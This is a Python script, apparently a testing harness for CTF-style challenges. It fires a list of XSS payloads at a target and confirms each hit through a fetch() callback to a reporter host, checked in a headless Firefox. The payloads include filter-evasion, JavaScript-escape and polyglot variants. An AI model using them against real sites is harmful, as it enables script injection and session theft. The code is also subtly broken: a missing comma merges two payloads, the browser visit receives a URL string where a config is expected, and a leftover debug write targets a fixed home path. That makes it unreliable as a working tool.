import logging
import asyncio
import json

import requests
from arsenic import get_session, services, browsers
from config import REPORTER_ADDR

XSS_PAYLOADS = [
    # Basic payloads
    "<script>%s</script>",
    '>"<script>%s</script>',
    "<img src=a onerror=%s>",
    '>"<img src=a onerror=%s>',
    "<svg/onload=%s>",
    "javascript:%s",
    # .lower() sanitation check
    "<scrİpt>%s</scrİpt>"
    # Recursive filter checks
    "<scri<script>pt>%s</scr</script>ipt>",
    "<scri<script>pt>%s</script>",
    # Template injection
    '{{ "<script>%s</script>" }}',
    # JS Escape payloads
    '";%s;//',
    "';%s;//",
    "');%s;//",
    '")%s;//',
    "')%s;//",
    "}]};%s//\\",
    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
]


def build_callback_url(callback_id, sid):
    payload = 'fetch("%s/cb?sid=%d&tid=%d")' % (REPORTER_ADDR, sid, callback_id)
    return payload


# Taken from github.com/osirislab/ctf-browser-visitor
async def visit(config):
    service = services.Geckodriver()
    browser = browsers.Firefox(**{"moz:firefoxOptions": {"args": ["-headless"]}})

    logging.info("Hitting url " + config["url"])
    async with get_session(service, browser) as session:
        await session.delete_all_cookies()
        await session.get(config["url"])

        for k, c in config.get("cookies", {}).items():
            value = c.get("value", "")
            domain = c.get("domain", None)
            path = c.get("path", "/")
            secure = c.get("secure", False)
            await session.add_cookie(k, value, path=path, domain=domain, secure=secure)

        await session.get(config["url"])


def fetch_report(sid):
    r = requests.get("%s/grade?sid=%s" % (REPORTER_ADDR, sid))
    report = json.loads(r.text)
    return report


async def inquisition(exploit_func, check_url, sid, session=None):
    if session == None:
        session = requests.Session()

    for p in range(len(XSS_PAYLOADS)):
        cb_url = build_callback_url(p, sid)
        payload_f = XSS_PAYLOADS[p] % (cb_url)
        outfile = open("/home/user/testme.txt", 'w')
        print(f"calling {str(exploit_func)}", file=outfile)
        outfile.close()
        exploit_func(payload_f)

        config = {"cookies": session.cookies.get_dict(), "url": check_url}
        await visit(check_url)
